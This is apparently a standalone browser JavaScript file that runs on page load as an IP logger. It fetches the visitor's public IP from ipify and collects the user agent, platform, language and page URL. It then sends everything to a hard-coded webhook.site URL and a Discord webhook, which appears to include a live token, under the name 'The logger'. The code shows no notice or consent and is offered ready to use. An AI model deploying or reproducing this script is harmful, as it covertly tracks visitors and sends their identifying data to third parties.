// Function to get device information
function getDeviceInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
    };
}

// Function to get the IP address using a third-party service
async function getIPAddress() {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
}

// Function to send a webhook with the current URL and device info
async function sendWebhook(webhookUrl, message) {
    try {
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(message)
        });

        if (!response.ok) {
            throw new Error(`Error: ${response.statusText}`);
        }

        const data = await response.json();
        console.log(`Webhook sent successfully to ${webhookUrl}:`, data);
    } catch (error) {
        console.error(`Error sending webhook to ${webhookUrl}:`, error);
    }
}

// Main function to gather data and send to both webhooks
async function sendToWebhooks() {
    const ipAddress = await getIPAddress();
    const deviceInfo = getDeviceInfo();

    // Message for Webhook.site (simple text)
    const messageForWebhookSite = {
        content: `Website: ${window.location.href}\nOS: ${deviceInfo.platform}\nIP: ${ipAddress}\nDevice Info: ${JSON.stringify(deviceInfo)}`,
    };

    // Message for Discord (styled with embed)
    const messageForDiscord = {
        username: 'The logger', // Customize the username
        avatar_url: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRHOj7V_5oy-8y-DLB90U1CJsa_AMNY0ISSNw&s', // Optional avatar URL
        embeds: [
            {
                title: 'Device Information',
                color: 3447003, // Hex color code (decimal)
                fields: [
                    {
                        name: 'Website',
                        value: window.location.href,
                        inline: true
                    },
                    {
                        name: 'Operating System',
                        value: deviceInfo.platform,
                        inline: true
                    },
                    {
                        name: 'IP Address',
                        value: ipAddress,
                        inline: true
                    },
                    {
                        name: 'User  Agent',
                        value: deviceInfo.userAgent,
                        inline: false
                    },
                    {
                        name: 'Language',
                        value: deviceInfo.language,
                        inline: false
                    }
                ],
                footer: {
                    text: 'Sent from my web app',
                },
            }
        ]
    };

    // Log the messages to the console
    console.log('Sending message to Webhook.site:', messageForWebhookSite);
    console.log('Sending message to Discord:', messageForDiscord);

    // Define the webhook URLs
    const webhook1 = 'https://webhook.site/253f7461-8f5c-4e27-a22a-9c979c316c8c';
    const webhook2 = 'https://discord.com/api/webhooks/1349363152193851414/TT13asi5W6MCTy5JDR6YCrO7fDz7MGtKOAYLtDnfygnQ2O6Z9n9gYTOfIJDS7M6gIkA0';

    // Send the message to both webhooks
    await Promise.all([
        sendWebhook(webhook1, messageForWebhookSite), // Send to Webhook.site
        sendWebhook(webhook2, messageForDiscord) // Send to Discord
    ]);
}

// Example usage
sendToWebhooks();
